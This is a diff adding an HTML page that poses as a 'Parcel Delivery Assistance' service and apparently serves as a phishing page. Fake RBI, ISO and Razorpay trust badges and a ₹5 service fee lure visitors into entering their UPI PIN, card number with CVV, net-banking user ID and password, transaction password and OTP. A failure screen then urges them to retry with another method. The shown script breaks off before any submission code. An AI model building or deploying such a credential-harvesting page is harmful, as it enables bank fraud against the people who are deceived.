@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Parcel Delivery Assistance</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        :root {
+            --primary: #2563eb;
+            --secondary: #f97316;
+            --background: #f8fafc;
+            --success: #10b981;
+            --error: #ef4444;
+            --text: #1e293b;
+            --light-text: #64748b;
+            --white: #ffffff;
+            --light-gray: #e2e8f0;
+            --border: #cbd5e1;
+            --razorpay: #2d84ff;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #cbd5e1 0%, #94a3b8 100%);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, #1e40af 100%);
+            color: var(--white);
+            padding: 24px;
+            text-align: center;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        
+        .tagline {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .trust-banner {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 10px;
+            font-size: 14px;
+            margin-top: 12px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .progress-container {
+            padding: 16px 24px;
+            background: var(--light-gray);
+            display: flex;
+            align-items: center;
+        }
+        
+        .progress-bar {
+            flex-grow: 1;
+            height: 8px;
+            background: var(--light-gray);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 0 12px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--secondary);
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .progress-text {
+            font-size: 14px;
+            color: var(--light-text);
+            min-width: 40px;
+            text-align: right;
+        }
+        
+        .form-page {
+            display: none;
+            padding: 32px;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+        
+        .form-page.active {
+            display: block;
+            opacity: 1;
+            animation: fadeIn 0.5s ease forwards;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .page-title {
+            font-size: 24px;
+            color: var(--primary);
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        
+        .option-cards {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .option-card {
+            background: var(--white);
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .option-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--primary);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .option-card i {
+            font-size: 36px;
+            color: var(--primary);
+            margin-bottom: 16px;
+        }
+        
+        .option-card.selected {
+            border-color: var(--secondary);
+            background-color: rgba(249, 115, 22, 0.05);
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--primary);
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+        
+        .input-with-icon {
+            position: relative;
+        }
+        
+        .input-with-icon i {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--light-text);
+        }
+        
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 32px;
+        }
+        
+        .btn {
+            padding: 14px 28px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: var(--secondary);
+            color: var(--white);
+        }
+        
+        .btn-primary:hover {
+            background: #ea580c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(249, 115, 22, 0.3);
+        }
+        
+        .btn-secondary {
+            background: var(--light-gray);
+            color: var(--text);
+        }
+        
+        .btn-secondary:hover {
+            background: #cbd5e1;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .trust-badge {
+            text-align: center;
+            margin-top: 24px;
+            padding: 16px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 10px;
+            color: var(--success);
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .payment-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .payment-option {
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .payment-option:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+        }
+        
+        .payment-option.selected {
+            border-color: var(--secondary);
+            background: rgba(249, 115, 22, 0.05);
+        }
+        
+        .bank-list-container {
+            max-height: 280px;
+            overflow-y: auto;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        .bank-list {
+            list-style: none;
+        }
+        
+        .bank-item {
+            padding: 14px 16px;
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+            transition: background 0.2s ease;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .bank-item:hover {
+            background: var(--light-gray);
+        }
+        
+        .bank-item:last-child {
+            border-bottom: none;
+        }
+        
+        .bank-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+            color: white;
+        }
+        
+        .featured-banks {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 20px 0;
+        }
+        
+        .featured-bank {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            padding: 12px;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+        }
+        
+        .featured-bank:hover {
+            background: var(--light-gray);
+        }
+        
+        .featured-bank.selected {
+            background: rgba(249, 115, 22, 0.1);
+        }
+        
+        .bank-circle {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .bank-name {
+            font-size: 13px;
+            text-align: center;
+            font-weight: 500;
+        }
+        
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 24px 0;
+        }
+        
+        .key {
+            padding: 16px;
+            background: var(--light-gray);
+            border: none;
+            border-radius: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .key:hover {
+            background: #cbd5e1;
+        }
+        
+        .key:active {
+            transform: scale(0.95);
+        }
+        
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 24px 0;
+        }
+        
+        .otp-digit {
+            width: 54px;
+            height: 64px;
+            text-align: center;
+            font-size: 24px;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+        }
+        
+        .otp-digit:focus {
+            border-color: var(--primary);
+            outline: none;
+        }
+        
+        .success-animation, .failure-animation {
+            text-align: center;
+            margin: 36px 0;
+        }
+        
+        .success-animation i, .failure-animation i {
+            font-size: 88px;
+        }
+        
+        .success-animation i {
+            color: var(--success);
+        }
+        
+        .failure-animation i {
+            color: var(--error);
+        }
+        
+        .reference-id {
+            text-align: center;
+            background: var(--light-gray);
+            padding: 16px;
+            border-radius: 10px;
+            margin: 24px 0;
+            font-weight: 500;
+        }
+        
+        .help-text {
+            text-align: center;
+            color: var(--light-text);
+            margin: 12px 0;
+            font-size: 15px;
+        }
+        
+        .secure-note {
+            background: rgba(37, 99, 235, 0.05);
+            padding: 12px;
+            border-radius: 8px;
+            margin: 12px 0;
+            font-size: 13px;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .payment-amount {
+            text-align: center;
+            font-size: 28px;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 18px 0;
+        }
+        
+        .security-features {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 24px 0;
+            flex-wrap: wrap;
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: var(--light-text);
+        }
+        
+        .security-badge.razorpay {
+            color: var(--razorpay);
+            font-weight: 600;
+        }
+        
+        .upi-rules-notice {
+            background: rgba(249, 115, 22, 0.1);
+            border-left: 4px solid var(--secondary);
+            padding: 14px;
+            margin: 18px 0;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+        
+        @media (max-width: 768px) {
+            .option-cards, .payment-options, .featured-banks {
+                grid-template-columns: 1fr;
+            }
+            
+            .btn-container {
+                flex-direction: column;
+                gap: 12px;
+            }
+            
+            .btn {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+        
+        .shake {
+            animation: shake 0.5s ease-in-out;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+        
+        /* Bank icons colors */
+        .bank-icon.sbi, .bank-circle.sbi { background: #436cba; }
+        .bank-icon.hdfc, .bank-circle.hdfc { background: #004c8e; }
+        .bank-icon.icici, .bank-circle.icici { background: #ff6a00; }
+        .bank-icon.axis, .bank-circle.axis { background: #6e0e8e; }
+        .bank-icon.kotak, .bank-circle.kotak { background: #ed1c24; }
+        .bank-icon.bob, .bank-circle.bob { background: #d71e28; }
+        .bank-icon.pnb, .bank-circle.pnb { background: #861d52; }
+        .bank-icon.canara, .bank-circle.canara { background: #d71e28; }
+        .bank-icon.indusind, .bank-circle.indusind { background: #003a6c; }
+        .bank-icon.yes, .bank-circle.yes { background: #004d7f; }
+        .bank-icon.idfc, .bank-circle.idfc { background: #e4252c; }
+        .bank-icon.federal, .bank-circle.federal { background: #0055a2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Parcel Delivery Assistance</div>
+            <div class="tagline">Your Parcel, Our Priority</div>
+            <div class="trust-banner">
+                <i class="fas fa-shield-alt"></i> RBI REGISTERED | ISO 27001 CERTIFIED | PCI DSS COMPLIANT
+            </div>
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-text">0%</div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+        
+        <!-- Screen 1: Problem Selection -->
+        <div class="form-page active" id="page1">
+            <h2 class="page-title">We're Here to Help You</h2>
+            <p class="help-text">Select your issue type</p>
+            
+            <div class="option-cards">
+                <div class="option-card" data-value="address" data-next="2">
+                    <i class="fas fa-home"></i>
+                    <div>Address Update</div>
+                </div>
+                <div class="option-card" data-value="unhold" data-next="2">
+                    <i class="fas fa-box-open"></i>
+                    <div>Unhold Parcel</div>
+                </div>
+                <div class="option-card" data-value="phone" data-next="2">
+                    <i class="fas fa-mobile-alt"></i>
+                    <div>Update Phone Number</div>
+                </div>
+                <div class="option-card" data-value="pickup" data-next="2">
+                    <i class="fas fa-truck-loading"></i>
+                    <div>Update Pickup Address</div>
+                </div>
+                <div class="option-card" data-value="other" data-next="2">
+                    <i class="fas fa-question-circle"></i>
+                    <div>Others</div>
+                </div>
+            </div>
+            
+            <div class="trust-badge">
+                <i class="fas fa-shield-alt"></i> 100% Secure & Confidential | 24/7 Customer Support
+            </div>
+        </div>
+        
+        <!-- Screen 2: Dynamic Form -->
+        <div class="form-page" id="page2">
+            <h2 class="page-title">Enter Your Details</h2>
+            
+            <div class="form-group">
+                <label for="trackingNumber">Tracking Number</label>
+                <div class="input-with-icon">
+                    <input type="text" id="trackingNumber" placeholder="e.g., ABC123456789">
+                    <i class="fas fa-check-circle" id="trackingCheck" style="display: none; color: var(--success);"></i>
+                    <i class="fas fa-exclamation-circle" id="trackingError" style="display: none; color: var(--error);"></i>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="customerName">Full Name</label>
+                <input type="text" id="customerName" placeholder="Your full name">
+            </div>
+            
+            <div class="form-group">
+                <label for="phoneNumber">Mobile Number</label>
+                <div class="input-with-icon">
+                    <input type="tel" id="phoneNumber" placeholder="e.g., 9876543210">
+                    <i class="fas fa-check-circle" id="phoneCheck" style="display: none; color: var(--success);"></i>
+                    <i class="fas fa-exclamation-circle" id="phoneError" style="display: none; color: var(--error);"></i>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="problemDescription">Problem Description</label>
+                <textarea id="problemDescription" rows="3" placeholder="Please describe your issue in detail"></textarea>
+            </div>
+            
+            <div class="trust-badge">
+                <i class="fas fa-lock"></i> Your information will be kept secure
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage1"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="nextToPage3">Next <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+        
+        <!-- Screen 3: Payment Amount -->
+        <div class="form-page" id="page3">
+            <h2 class="page-title">Service Fee Payment</h2>
+            
+            <div class="form-group">
+                <label for="paymentAmount">Payment Amount (₹)</label>
+                <input type="number" id="paymentAmount" value="5" min="1">
+            </div>
+            
+            <div class="secure-note">
+                <i class="fas fa-info-circle"></i> Service fee is set to ₹5, you can modify it if needed
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage2"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="nextToPage4">Proceed <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+        
+        <!-- Screen 4: Payment Options -->
+        <div class="form-page" id="page4">
+            <h2 class="page-title">Select Payment Method</h2>
+            <div class="payment-amount" id="amountDisplay">₹5</div>
+            
+            <div class="payment-options">
+                <div class="payment-option" data-method="upi" data-next="5">
+                    <i class="fas fa-mobile-alt" style="font-size: 40px; margin-bottom: 10px;"></i>
+                    <div>UPI</div>
+                </div>
+                <div class="payment-option" data-method="debit" data-next="6">
+                    <i class="fas fa-credit-card" style="font-size: 40px; margin-bottom: 10px;"></i>
+                    <div>Debit Card</div>
+                </div>
+                <div class="payment-option" data-method="credit" data-next="6">
+                    <i class="fas fa-credit-card" style="font-size: 40px; margin-bottom: 10px;"></i>
+                    <div>Credit Card</div>
+                </div>
+                <div class="payment-option" data-method="netbanking" data-next="7">
+                    <i class="fas fa-university" style="font-size: 40px; margin-bottom: 10px;"></i>
+                    <div>Net Banking</div>
+                </div>
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+                <div class="security-badge"><i class="fas fa-check-circle"></i> PCI DSS Compliant</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage3"><i class="fas fa-arrow-left"></i> Back</button>
+            </div>
+        </div>
+        
+        <!-- Screen 5: UPI Payment -->
+        <div class="form-page" id="page5">
+            <h2 class="page-title">Pay with UPI</h2>
+            <div class="payment-amount" id="upiAmountDisplay">₹5</div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="bankSearch">Search Bank</label>
+                <input type="text" id="bankSearch" placeholder="Search for your bank">
+            </div>
+            
+            <h3 style="margin: 15px 0 10px; font-size: 16px;">Popular Banks</h3>
+            <div class="featured-banks">
+                <div class="featured-bank" data-bank="sbi">
+                    <div class="bank-circle sbi">SBI</div>
+                    <div class="bank-name">SBI</div>
+                </div>
+                <div class="featured-bank" data-bank="hdfc">
+                    <div class="bank-circle hdfc">HDFC</div>
+                    <div class="bank-name">HDFC</div>
+                </div>
+                <div class="featured-bank" data-bank="icici">
+                    <div class="bank-circle icici">ICICI</div>
+                    <div class="bank-name">ICICI</div>
+                </div>
+                <div class="featured-bank" data-bank="axis">
+                    <div class="bank-circle axis">Axis</div>
+                    <div class="bank-name">Axis</div>
+                </div>
+                <div class="featured-bank" data-bank="kotak">
+                    <div class="bank-circle kotak">Kotak</div>
+                    <div class="bank-name">Kotak</div>
+                </div>
+                <div class="featured-bank" data-bank="bob">
+                    <div class="bank-circle bob">BOB</div>
+                    <div class="bank-name">BOB</div>
+                </div>
+                <div class="featured-bank" data-bank="pnb">
+                    <div class="bank-circle pnb">PNB</div>
+                    <div class="bank-name">PNB</div>
+                </div>
+                <div class="featured-bank" data-bank="canara">
+                    <div class="bank-circle canara">Canara</div>
+                    <div class="bank-name">Canara</div>
+                </div>
+                <div class="featured-bank" data-bank="yes">
+                    <div class="bank-circle yes">YES</div>
+                    <div class="bank-name">YES</div>
+                </div>
+            </div>
+            
+            <h3 style="margin: 20px 0 10px; font-size: 16px;">All Banks (A-Z)</h3>
+            <div class="bank-list-container">
+                <ul class="bank-list">
+                    <li class="bank-item" data-bank="sbi">
+                        <div class="bank-icon sbi">SBI</div>
+                        <div>State Bank of India</div>
+                    </li>
+                    <li class="bank-item" data-bank="hdfc">
+                        <div class="bank-icon hdfc">HDFC</div>
+                        <div>HDFC Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="icici">
+                        <div class="bank-icon icici">ICICI</div>
+                        <div>ICICI Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="axis">
+                        <div class="bank-icon axis">Axis</div>
+                        <div>Axis Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="kotak">
+                        <div class="bank-icon kotak">Kotak</div>
+                        <div>Kotak Mahindra Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="bob">
+                        <div class="bank-icon bob">BOB</div>
+                        <div>Bank of Baroda</div>
+                    </li>
+                    <li class="bank-item" data-bank="pnb">
+                        <div class="bank-icon pnb">PNB</div>
+                        <div>Punjab National Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="canara">
+                        <div class="bank-icon canara">Canara</div>
+                        <div>Canara Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="indusind">
+                        <div class="bank-icon indusind">Indus</div>
+                        <div>IndusInd Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="yes">
+                        <div class="bank-icon yes">YES</div>
+                        <div>Yes Bank</div>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="form-group">
+                <label for="upiPin">UPI PIN</label>
+                <input type="password" id="upiPin" placeholder="4 or 6 digit UPI PIN" maxlength="6">
+            </div>
+            
+            <div class="keypad">
+                <button class="key">1</button>
+                <button class="key">2</button>
+                <button class="key">3</button>
+                <button class="key">4</button>
+                <button class="key">5</button>
+                <button class="key">6</button>
+                <button class="key">7</button>
+                <button class="key">8</button>
+                <button class="key">9</button>
+                <button class="key" style="visibility: hidden;"></button>
+                <button class="key">0</button>
+                <button class="key"><i class="fas fa-backspace"></i></button>
+            </div>
+            
+            <div class="secure-note">
+                <i class="fas fa-info-circle"></i> Do not share your UPI PIN with anyone
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage4"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="processUpiPayment">Pay Now</button>
+            </div>
+        </div>
+        
+        <!-- Screen 6: Card Payment -->
+        <div class="form-page" id="page6">
+            <h2 class="page-title" id="cardPageTitle">Pay with Card</h2>
+            <div class="payment-amount" id="cardAmountDisplay">₹5</div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+            </div>
+            
+            <div class="form-group">
+                <label for="cardName">Cardholder Name</label>
+                <input type="text" id="cardName" placeholder="e.g., Rajesh Kumar">
+            </div>
+            
+            <div style="display: flex; gap: 15px;">
+                <div class="form-group" style="flex: 1;">
+                    <label for="expiryDate">Expiry Date</label>
+                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="3">
+                </div>
+            </div>
+            
+            <div class="secure-note">
+                <i class="fas fa-lock"></i> Your card details are being securely processed
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage4FromCard"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="processCardPayment">Pay Now</button>
+            </div>
+        </div>
+        
+        <!-- Screen 7: Net Banking -->
+        <div class="form-page" id="page7">
+            <h2 class="page-title">Pay with Net Banking</h2>
+            <div class="payment-amount" id="netAmountDisplay">₹5</div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="netBankSearch">Search Bank</label>
+                <input type="text" id="netBankSearch" placeholder="Search for your bank">
+            </div>
+            
+            <h3 style="margin: 15px 0 10px; font-size: 16px;">Popular Banks</h3>
+            <div class="featured-banks">
+                <div class="featured-bank" data-bank="sbi">
+                    <div class="bank-circle sbi">SBI</div>
+                    <div class="bank-name">SBI</div>
+                </div>
+                <div class="featured-bank" data-bank="hdfc">
+                    <div class="bank-circle hdfc">HDFC</div>
+                    <div class="bank-name">HDFC</div>
+                </div>
+                <div class="featured-bank" data-bank="icici">
+                    <div class="bank-circle icici">ICICI</div>
+                    <div class="bank-name">ICICI</div>
+                </div>
+                <div class="featured-bank" data-bank="axis">
+                    <div class="bank-circle axis">Axis</div>
+                    <div class="bank-name">Axis</div>
+                </div>
+                <div class="featured-bank" data-bank="kotak">
+                    <div class="bank-circle kotak">Kotak</div>
+                    <div class="bank-name">Kotak</div>
+                </div>
+            </div>
+            
+            <h3 style="margin: 20px 0 10px; font-size: 16px;">All Banks (A-Z)</h3>
+            <div class="bank-list-container">
+                <ul class="bank-list">
+                    <li class="bank-item" data-bank="sbi">
+                        <div class="bank-icon sbi">SBI</div>
+                        <div>State Bank of India</div>
+                    </li>
+                    <li class="bank-item" data-bank="hdfc">
+                        <div class="bank-icon hdfc">HDFC</div>
+                        <div>HDFC Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="icici">
+                        <div class="bank-icon icici">ICICI</div>
+                        <div>ICICI Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="axis">
+                        <div class="bank-icon axis">Axis</div>
+                        <div>Axis Bank</div>
+                    </li>
+                    <li class="bank-item" data-bank="kotak">
+                        <div class="bank-icon kotak">Kotak</div>
+                        <div>Kotak Mahindra Bank</div>
+                    </li>
+                </ul>
+            </div>
+            
+            <div class="form-group">
+                <label for="userId">User ID</label>
+                <input type="text" id="userId" placeholder="Enter your User ID">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your Password">
+            </div>
+            
+            <div class="secure-note">
+                <i class="fas fa-info-circle"></i> Please enter your transaction password on the next page to complete the transaction
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage4FromNet"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="processNetBanking">Proceed</button>
+            </div>
+        </div>
+        
+        <!-- Screen 8: Transaction Password -->
+        <div class="form-page" id="page8">
+            <h2 class="page-title">Enter Transaction Password</h2>
+            <div class="payment-amount" id="txnAmountDisplay">₹5</div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="transactionPassword">Transaction Password</label>
+                <input type="password" id="transactionPassword" placeholder="Enter your transaction password">
+            </div>
+            
+            <div class="secure-note">
+                <i class="fas fa-shield-alt"></i> This password is provided by your bank
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPage7"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="processTransaction">Submit</button>
+            </div>
+        </div>
+        
+        <!-- Screen 9: OTP Verification -->
+        <div class="form-page" id="page9">
+            <h2 class="page-title">OTP Verification</h2>
+            <p class="help-text">Enter OTP sent to your mobile number XXXXXX1234</p>
+            
+            <div class="otp-container">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+                <input type="text" class="otp-digit" maxlength="1" pattern="[0-9]">
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <p class="help-text">Didn't receive OTP? <a href="#" style="color: var(--secondary);">Resend</a></p>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="backToPaymentMethod"><i class="fas fa-arrow-left"></i> Back</button>
+                <button class="btn btn-primary" id="verifyOtp">Verify & Pay</button>
+            </div>
+        </div>
+        
+        <!-- Screen 10: Payment Failed -->
+        <div class="form-page" id="page10">
+            <div class="failure-animation">
+                <i class="fas fa-times-circle"></i>
+            </div>
+            
+            <h2 class="page-title">Payment Failed</h2>
+            <p class="help-text" id="failureReason">Your transaction could not be completed. Please try again.</p>
+            
+            <div class="reference-id">
+                Reference ID: PC987654321
+            </div>
+            
+            <div class="security-features">
+                <div class="security-badge razorpay"><i class="fas fa-lock"></i> Secure by Razorpay</div>
+                <div class="security-badge"><i class="fas fa-shield-alt"></i> RBI Registered</div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" id="tryAnotherMethod">Try Another Method</button>
+                <button class="btn btn-primary" id="retryPayment">Retry Payment</button>
+            </div>
+            
+            <p class="help-text">Issue persists? 24x7 Helpline: XXXX-XXX-XXX</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Current page tracker
+            let currentPage = 1;
+            const totalPages = 10;
+            let selectedProblem = null;
+            let selectedPaymentMethod = null;
+            let selectedBank = null;
+            let paymentAmount = 5;
+            
+            // Update progress bar
+            function updateProgress() {
+                const percentage = Math.round((currentPage / totalPages) * 100);
+                document.querySelector('.progress-fill').style.width = `${percentage}%`;
+                document.querySelector('.progress-text').textContent = `${percentage}%`;
+            }
+            
+            // Navigate to specific page
+            function goToPage(pageNumber) {
+                document.querySelectorAll('.form-page').forEach(page => {
+                    page.classList.remove('active');
+                });
+                
+                document.getElementById(`page${pageNumber}`).classList.add('active');
+                currentPage = pageNumber;
+                updateProgress();
+                
+                // Update payment amount displays
+                if (pageNumber >= 4 && pageNumber <= 8) {
+                    document.querySelectorAll('.payment-amount').forEach(el => {
+                        el.textContent = `₹${paymentAmount}`;
+                    });
+                }
+                
+                // Scroll to top on page change
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+            
+            // Page 1: Problem Selection
+            document.querySelectorAll('.option-card').forEach(card => {
+                card.addEventListener('click', function() {
+                    document.querySelectorAll('.option-card').forEach(c => {
